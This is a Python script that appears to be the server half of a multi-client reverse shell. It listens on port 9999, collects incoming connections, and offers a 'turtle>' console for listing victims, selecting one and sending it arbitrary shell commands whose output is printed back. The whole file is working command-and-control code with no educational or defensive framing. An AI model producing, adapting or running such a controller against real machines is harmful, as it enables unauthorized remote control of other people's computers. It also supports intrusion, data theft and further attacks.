import socket
import sys
import threading
from queue import Queue
import time

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global port
        global host
        global s
        port = 9999
        host = ""
        s = socket.socket()
        print("socket created!")
    except socket.error as e:
        print("Socket creation error", e)


# binding the socket and listening to connections
def bind_socket():
    try:
        global port
        global host
        global s
        print("Binding with port :", port)

        s.bind((host, port))
        s.listen()

        print("Port Binded")
    except socket.error as e:
        print("Socket Binding Error", e)
        bind_socket()
        
def accepting_connections():
    for c in all_connections:
        c.close()
        
    del all_address[:]
    del all_connections[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            
            all_address.append(address)
            all_connections.append(conn)

            print("Connection has been establish :", address[0])

        except:
            print("Error while accepting a connection...")
            
def start_turtle():
    while True:
        cmd = input("turtle>")

        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognised")
        
def list_connections():
    if all_connections:
        result = ""
        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(10240)
            except:
                del all_connections[i]
                del all_address[i]
                continue
            
            result = f"{i}   {all_address[i][0]} {all_address[i][1]}"

        print("-----Client-----" + "\n" + result)
    else:
        print("No client available!")

def get_target(cmd):
    try:
        id = int(cmd[7:])
        conn = all_connections[id]
        print("You are connected to", all_address[id][0])
        print(all_address[id][0] + ">", end="")
        return conn
    except:
        print("Id is not valid")
        return None
    
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            
            if len(cmd) > 0:
                print(cmd)
                conn.send(str.encode(cmd))
                
                resp_data = ""
                client_resp = str(conn.recv(1024), "utf-8")

                while len(client_resp) == 1024:
                    resp_data += client_resp
                    client_resp = str(conn.recv(1024), "utf-8")
                else:
                    resp_data += client_resp                
                
                print(resp_data)
                
        except:
            print(sys.exc_info())
            print("Error sending command to the client")
            break
        
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
        
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        
        if x == 2:
            start_turtle()
            
        queue.task_done()
        
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
        
    queue.join()
    
create_workers()
create_jobs()